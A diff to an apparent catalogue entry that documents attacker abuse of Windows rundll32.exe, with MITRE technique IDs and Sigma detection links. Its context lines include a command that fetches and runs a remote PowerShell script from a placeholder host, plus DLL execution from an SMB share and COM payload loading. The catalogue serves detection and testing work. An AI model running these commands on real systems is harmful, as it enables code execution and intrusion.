@@ -11,6 +11,7 @@ Commands:
     Privileges: User
     MitreID: T1218.011
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    Tags: [DLL]
   - Command: rundll32.exe \\10.10.10.10\share\payload.dll,EntryPoint
     Description: Use Rundll32.exe to execute a DLL from a SMB share. EntryPoint is the name of the entry point in the .DLL file to execute.
     Usecase: Execute DLL from SMB share.
@@ -18,6 +19,7 @@ Commands:
     Privileges: User
     MitreID: T1218.011
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    Tags: [DLL]
   - Command: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');")
     Description: Use Rundll32.exe to execute a JavaScript script that runs a PowerShell script that is downloaded from a remote web site.
     Usecase: Execute code from Internet
@@ -53,18 +55,18 @@ Commands:
     Privileges: User
     MitreID: T1564.004
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    Tags: [DLL]
   - Command: rundll32.exe -sta {CLSID}
-    Description: Use Rundll32.exe to load a registered or hijacked COM Server payload.  Also works with ProgID.
+    Description: Use Rundll32.exe to load a registered or hijacked COM Server payload. Also works with ProgID.
     Usecase: Execute a DLL/EXE COM server payload or ScriptletURL code.
     Category: Execute
     Privileges: User
     MitreID: T1218.011
     OperatingSystem: Windows 10 (and likely previous versions), Windows 11
+    Tags: [DLL]
 Full_Path:
   - Path: C:\Windows\System32\rundll32.exe
   - Path: C:\Windows\SysWOW64\rundll32.exe
-Code_Sample:
-  - Code:
 Detection:
   - Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/network_connection/net_connection_win_rundll32_net_connections.yml
   - Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml
